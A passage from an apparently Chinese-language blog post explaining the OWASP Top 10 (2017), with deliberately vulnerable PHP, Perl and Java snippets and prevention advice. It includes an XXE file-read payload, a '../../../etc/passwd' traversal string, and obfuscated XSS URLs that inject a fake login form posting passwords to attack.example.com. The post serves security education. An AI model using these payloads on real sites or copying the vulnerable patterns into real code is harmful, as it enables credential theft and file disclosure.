title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">persistLogin</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token operator">=></span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"userdata"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此代码将用户的信息写入cookie，因此用户以后不必再次登录</p><p>该代码以纯文本的格式将用户的用户名和密码存储在计算机的cookie中，如果攻击者破坏了用户的计算机，则这将公开用户的登录信息，即使用户的计算机没有受到损害，当这种弱点加上跨站点脚本可能使攻击者远程复制cookie</p><h4 id="Prevent-2"><a href="#Prevent-2" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>对应用程序处理，存储或传输的数据进行分类。</li><li>不存储不必要的敏感数据，尽快将其丢弃</li><li>确保对静态的所有敏感数据进行加密，并且使用最新且功能强大的标准算法，协议和密钥</li><li>使用安全协议对传输中的所有数据进行加密，如https，hsts</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">A3:2017-Sensitive Data Exposure</a></p><h3 id="XML外部实体（XXE）"><a href="#XML外部实体（XXE）" class="headerlink" title="XML外部实体（XXE）"></a>XML外部实体（XXE）</h3><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>XXE 全称为XML External Entity attack 即XML<a href="https://baike.baidu.com/item/可扩展标记语言/2885849?fromtitle=xml&fromid=86251&fr=aladdin">(可扩展标记语言)</a> 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(<a href="https://baike.baidu.com/item/URI/16481812">统一资源标识符</a>)文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施<a href="https://baike.baidu.com/item/拒绝服务攻击/421896?fr=aladdin">拒绝服务攻击</a>。</p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///d://flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>具体参考本站：<a href="https://www.extrader.top/posts/55c267c8/">XXE学习笔记</a></p><h4 id="Prevent-3"><a href="#Prevent-3" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>尽可能使用不太复杂的数据格式（如：JSON）避免敏感数据的序列化</li><li>修补或升级应用程序或基础操作系统上正在使用的所有XML处理器和库</li><li>在应用程序的所有XML解析器中禁用XML外部实体和DTD处理。</li><li>在服务器端实施“白名单”输入验证，过滤或清理操作</li></ol><h3 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，例：访问用户的账户、敏感文件、获取和正常用户相同的权限等.</p><h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/cwe/profiles"</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span> <span class="token operator">.</span> <span class="token string">"/"</span> <span class="token operator">.</span> <span class="token variable">$username</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;$profilePath"</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span></code></pre><p>以上代码可能适用于社交网络应用程序，其中用户的个人资料信息都存储在单独的文件中，所有文件都存储在一个目录中</p><p>尽管程序员打算访问“/users/cwe/profiles/alice”之类的文件，但没有验证传入的用户参数。攻击者可能会提供以下字符串：</p><pre class="language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>该程序将生成如下的配置文件路径名：</p><pre class="language-none"><code class="language-none">&#x2F;users&#x2F;cwe&#x2F;profiles&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>打开文件后，操作系统会在路径规范化期间解析“ ../”，并实际访问此文件：</p><pre class="language-none"><code class="language-none">&#x2F;etc&#x2F;passwd</code></pre><p>结果，攻击者可以阅读密码文件的整个文本</p><h4 id="Prevent-4"><a href="#Prevent-4" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>除公共资源外，默认情况下拒绝</li><li>一次实施访问控制机制，并在整个应用程序中重复使用它们，包括最大程度地减少<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>的使用。</li><li>禁用Web服务器目录列表，并确保Web根目录中不存在文件元数据（例如.git）和备份文件。</li><li>限速API和控制器访问权限，以最大程度减少自动攻击工具带来的危害。</li></ol><h3 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h3><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><p>安全配置错误是比较常见的漏洞，由于操作者的不当配置(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</p><h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"config.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> password <span class="token operator">=</span> prop<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> usr<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>以下代码从属性文件中读取密码，并使用该密码连接到数据库。</p><p>该代码将成功运行，但是有权访问config.properties的任何人都可以读取密码的值。如果攻击者有权访问此信息，则可以使用它来入侵系统。</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256: Unprotected Storage of Credentials</a></p><h4 id="Prevent-5"><a href="#Prevent-5" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>自动化安装部署，保证开发，QA，产品环境的配置尽量相同，减少部署一个新安全环境的耗费，</li><li>及时了解并部署每个环境的软件更新和补丁信息</li><li>使用提供有效分离的安全性强大的应用程序架构</li><li>实施漏洞扫描和安全审计，以帮助检查错误的配置或者未安装的补丁</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">A6：2017-安全性错误配置</a></p><h3 id="跨站点脚本（XSS）"><a href="#跨站点脚本（XSS）" class="headerlink" title="跨站点脚本（XSS）"></a>跨站点脚本（XSS）</h3><h4 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h4><p>xss攻击全称为<a href="https://baike.baidu.com/item/XSS攻击/954065?fr=aladdin">跨站脚本攻击</a>,当应用程序的新网页中包含不受信任的、未经恰当验证、转义的数据或可以使用HTML、JavaScript的浏览器API更新的现有网页时，就会出现xss漏洞，跨站脚本攻击是最普遍的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。</p><h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example"></a>Example</h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="header"> Welcome, '</span> <span class="token operator">.</span> <span class="token variable">$username</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre><p>以上代码基于HTTP GET用户名参数在网页上显示欢迎消息。</p><p>由于参数可以是任意的，因此可以修改页面的url，因此<code>$username</code>可以包含脚本语法，例如：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript">alert("You've been attacked!");&lt;/Script></code></pre><p>这样会弹出无害的警告对话框，最初这不是一个很大的漏洞，毕竟，为什么有人输入一个导致恶意代码在其自己的计算机上运行的URL？真正的危险在于，攻击者将创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者单击链接时，他们会通过易受攻击的Web应用程序不经意地将恶意内容反映回自己的计算机。更现实的是，攻击者可以在页面上嵌入一个伪造的登录框，诱使用户将用户的密码发送给攻击者：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword">Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: &lt;input type="text" name="username" />&lt;br/>Password: &lt;input type="password" name="password" />&lt;br/>&lt;input type="submit" value="Login" />&lt;/form>&lt;/div></code></pre><p>如果用户单击此链接，那么Welcome.php将生成以下HTML并将其发送到用户的浏览器：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Welcome, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stealPassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Please Login:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attack.example.com/stealPassword.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        Password: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>但是，精明的用户可能会注意到URL上附加了可疑文本。攻击者可能进一步混淆URL（以下示例链接分为多行以提高可读性）：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</code></pre><p>相同的攻击字符串也可能被混淆为：</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript">document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script></code></pre><p>这两个攻击链接都将导致页面上显示伪造的登录框，并且用户更有可能忽略URL末尾的难以理解的文本。</p><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>CreateUser.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fullName</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$fullName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Insert Into users (username,password) Values ("%s","%s","%s")'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$fullName</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ListUsers.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Select * From users Where loggedIn=true'</span><span class="token punctuation">;</span><span class="token variable">$results</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Print list of users to page</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div id="userlist">Currently Active Users:'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$results</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="userNames">'</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fullname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre><p>以上的web应用程序由两个独立的页面组成，一个页面用于创建用户的账户，另外一个页面用于列出当前登录的活动用户</p><p>攻击者可以将其名称设置为任意HTML，然后将其显示给“活动用户”页面的所有访问者。该HTML例如可以是窃取登录消息的密码。</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></p><h4 id="Prevent-6"><a href="#Prevent-6" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>使用设计上自动转义XSS的框架，例如最新的Ruby on Rails, React JS，了解每个框架的XSS保护的局限性，并适当处理未涵盖的用例</li><li>根据HTML输出中的上下文（正文，属性，JavaScript，CSS，或URL）转义不受信任的HTTP请求数据将解决XSS漏洞</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">A7:2017-Cross-Site Scripting (XSS)</a></p><h3 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h3><h4 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h4><p>不安全的反序列化可以导致<a href="https://baike.baidu.com/item/远程代码执行漏洞/2491231?fr=aladdin">远程代码执行</a>、<a href="https://baike.baidu.com/item/重放攻击?fromtitle=重播攻击&fromid=19455997">重放攻击</a>、注入攻击或特权升级攻击</p><h4 id="Example-7"><a href="#Example-7" class="headerlink" title="Example"></a>Example</h4><p>参考本站：</p><ul><li><a href="https://www.extrader.top/posts/bb56c28a/">phar反序列化浅析</a></li><li><a href="https://www.extrader.top/posts/488d0f65/">python反序列化漏洞浅析</a></li><li><a href="https://www.extrader.top/posts/d3333ead/">ctf-反序列化</a></li></ul><h4 id="Prevent-7"><a href="#Prevent-7" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>在所有序列化对象上实施完整性检查，例如数字签名，以防止恶意创建对象或篡改数据。</li><li>在对象创建之前的反序列化过程中强制执行严格的类型约束，因为代码通常希望使用一组可定义的类。</li><li>隔离并运行可能在低特权环境中反序列化的代码。</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">A8:2017-Insecure Deserialization</a></p><h3 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h3><h4 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h4><p><a href="https://baike.baidu.com/item/组件/6902128?fr=aladdin">组件</a>(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。</p><h4 id="Example-8"><a href="#Example-8" class="headerlink" title="Example"></a>Example</h4><p>参考本站：</p><ul><li><a href="https://www.extrader.top/posts/67caa546/">CTF-CVE</a></li></ul><p>漏洞查找：</p><p><a href="https://www.cvedetails.com/version-search.php">MITER常见漏洞和披露（CVE）搜索</a></p><p><a href="https://nvd.nist.gov/">NVD漏洞数据库</a></p><h4 id="Prevent-8"><a href="#Prevent-8" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>使用诸如<a href="https://www.mojohaus.org/versions-maven-plugin/">version</a>，<a href="https://owasp.org/www-project-dependency-check">DependencyCheck</a>，<a href="https://github.com/retirejs/retire.js/">retire.js</a>等工具，连续清点客户端和服务器端组件（例如，框架，库）的<a href="https://www.mojohaus.org/versions-maven-plugin/">版本</a>及其依赖<a href="https://github.com/retirejs/retire.js/">项</a>。持续监视<a href="https://cve.mitre.org/">CVE</a>和<a href="https://nvd.nist.gov/">NVD</a>等来源的组件中的漏洞。使用软件组成分析工具来自动化该过程。订阅电子邮件警报以获取与您使用的组件相关的安全漏洞。</li><li>仅通过安全链接从官方来源获取组件。优先选择经过签名的软件包，以减少包含经过修改的恶意组件的机会。</li><li>监视未维护的库和组件或未为旧版本创建安全补丁的组件。如果无法修补，请考虑部署<a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">虚拟修补程序</a>以监视，检测或防止发现的问题。</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017-Using Components with Known Vulnerabilities</a></p><h3 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h3><h4 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h4><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。</p><h4 id="Example-9"><a href="#Example-9" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">incrementLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">recentLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed login attempt by User: "</span> <span class="token operator">.</span> <span class="token variable">$userName</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" at "</span> <span class="token operator">+</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>以上代码记录可疑的多次登录尝试。</p><p>此代码仅在达到特定限制时记录失败的登录尝试。如果攻击者知道此限制，则可以通过避免该限制来阻止发现攻击。</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></p><h4 id="Prevent-9"><a href="#Prevent-9" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>确保可以使用足够的用户上下文记录所有登录，访问控制失败和服务器端输入验证失败的事件，以识别可疑或恶意帐户，并保留足够的时间以进行处理。</li><li>确保以一种集中式日志管理解决方案可以轻松使用的格式生成日志。</li><li>确保高价值交易具有完整性控制的审计跟踪，以防止篡改或删除，例如仅追加数据库表或类似内容。</li><li>建立有效的监视和警报，以便及时发现并应对可疑活动。</li><li>建立或采用事件响应和恢复计划，例如<a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a>或更高版本。</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">A10:2017-Insufficient Logging &amp; Monitoring</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://owasp.org/www-project-top-ten/2017/Top_10">OWASP Top 10 Application Security Risks - 2017</a></li><li><a href="https://blog.csdn.net/wang_624/article/details/89683571">OWASP Top 10 简单介绍</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://owasp.org/&quot;&gt;Owasp&lt;/a&gt; 全称 Open Web Application Security Project（开放式Web应用程序安全项目）。&lt;/p&gt;
&lt;p&gt;其中最具权威的就是其”十大安全漏洞列表”，目前正式发布的最新版本是2017年11月份发布的。&lt;/p&gt;
